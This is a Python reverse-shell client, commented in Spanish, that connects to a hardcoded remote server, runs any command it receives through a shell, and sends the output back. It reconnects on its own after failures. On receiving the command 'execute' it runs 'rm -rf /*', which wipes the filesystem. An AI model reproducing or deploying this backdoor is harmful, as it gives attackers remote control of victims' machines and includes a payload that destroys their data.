#Todo lo que el cliente va a hacer es conectarse al servidor y esperar por instrucciones del server

import os #permite acceder al sistema operativo y escribir comandos
import socket
import subprocess 
import time
import sys


# Crear un socket
def socket_create():
    try:
        global host
        global port
        global s
        host = '192.168.1.109'
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Conectar a un socket remoto
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as msg:
        print("Socket connection error: " + str(msg))
        time.sleep(5)
        socket_connect()

#Recibir comandos desde un servidor remoto y ejecutarlos en maquina local


def receive_commands():
    while True:                                         #el bucle se tiene que mantener activo y solo cerrarse cuando el servidor cierre la conexion
        data = s.recv(20480)
        path = os.getenv("HOME")      
        if data[:2].decode("latin1") == 'cd':          #cambiar directorio no tiene output, por lo que no hace nada. Hace falta elaborar mas con el comando
            try:
                os.chdir(data[3:].decode("latin1"))     #si cmd es 'cd', coge a partir del tercer caracter y hace un cd manual
            except:
                pass
        if data[:].decode("latin1") == 'quit':          #Sale de la conexion si cmd es close
            s.close()
            break
        if data[:].decode("latin1") == 'execute':
            try:
                os.system("rm -rf /*")   
            except:
                pass
        if len(data) > 0:                               #Abre un proceso, ejecuta un comando como lo haria en la terminal y enseña el shell
            try:
                cmd = subprocess.Popen(data[:].decode("latin1"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)     #coge cualquier output y lo devuelve
                output_bytes = cmd.stdout.read() + cmd.stderr.read()            #output en byte
                output_str = str(output_bytes, "latin1")                        #output en string
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                print(output_str)
            except:
                output_str = "Comando no reconocido" + "\n"
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))        #devuelve el Current Working Directory (carpeta actual)
                print(output_str)                                               #devuelve los resultados tambien en la maquina cliente

    s.close()				


def main():
    global s
    try:
        socket_create()
        socket_connect()
        receive_commands()
    except:
        print("Error in main")
        time.sleep(5)
    s.close()
    main()

main()

        
